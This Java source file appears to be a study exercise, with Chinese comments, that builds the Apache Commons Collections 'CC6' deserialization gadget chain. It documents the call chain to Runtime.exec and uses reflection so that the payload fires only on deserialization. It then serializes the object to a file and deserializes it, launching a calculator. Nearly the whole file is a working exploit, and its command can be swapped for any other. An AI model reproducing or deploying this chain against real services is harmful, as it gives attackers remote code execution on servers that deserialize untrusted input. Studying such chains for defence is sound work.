import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * ObjectInputStream.readObject()
 * 	HashSet.readObject()
 * 		HashMap.put()
 * 			HashMap.hash()
 * 				TiedMapEntry.hashCode()
 * 					TiedMapEntry.getValue()
 * 						LazyMap.get()
 * 							ChainedTransformer.transform()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Runtime.exec()
 */
public class CC6 {
    public static void main(String[] args) throws Exception {
//

//      链式+Constant
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });



//        LazyMap
//        HashMap<Object, Object> map = new HashMap<>();
//        Map lazy = LazyMap.decorate(map, chainedTransformer);
//
//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
//        constructor.setAccessible(true);
//        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazy);
//
//        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, annotationInvocationHandler);
//
//        Object o = constructor.newInstance(Override.class, mapProxy);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazy = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, "aaa");

        HashMap<Object, Object> map2 =  new HashMap<>();


//      类似URLDNS那条链，先不填充，put后再填充，以便序列化时不触发，反序列化时触发
        Class c = tiedMapEntry.getClass();
        Field declaredField = c.getDeclaredField("map");
        declaredField.setAccessible(true);
        declaredField.set(tiedMapEntry,new HashMap<>());

        map2.put(tiedMapEntry, "bbb");

        declaredField.set(tiedMapEntry,lazy);
        serialize(map2);
        unSerialize("ser.bin");

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unSerialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
